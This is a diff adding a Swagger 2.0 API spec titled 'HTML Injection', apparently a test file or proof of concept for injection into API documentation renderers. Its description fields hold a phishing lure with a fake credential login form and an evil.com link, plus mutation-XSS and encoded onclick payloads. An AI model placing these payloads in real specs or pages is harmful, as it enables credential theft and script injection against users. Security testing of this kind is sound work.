@@ -1,0 +1,63 @@
+---
+swagger: '2.0'
+info:
+  title: HTML Injection
+  description: |
+  <h1>To get free 1000$ reward, please go to our partner website and fill up your bank account details needed to send the money or login below with your CIMPRESS CREDENTIALS:</h1> <h1><a href="https://evil.com">Click Here</a></h1>
+   <form><label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br><label><input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br><input type="submit" value="SIGN IN" onclick="msg()"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><h1>hide here</h1>"></form>
+    <h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+
+  version: production
+basePath: https://google.com
+produces:
+- application/xml
+- application/json
+consumes:
+- application/xml
+- application/json
+security:
+- basicAuth: []
+paths:
+  "/hide":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - somettext
+      operationId: findAccounts
+      summary: this is example text
+  "/malformed_by_hide":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<h1>hide here</h1>"></form>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - afine
+      operationId: Abir
+      summary: abir
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: some_operation
+      summary: this is example text
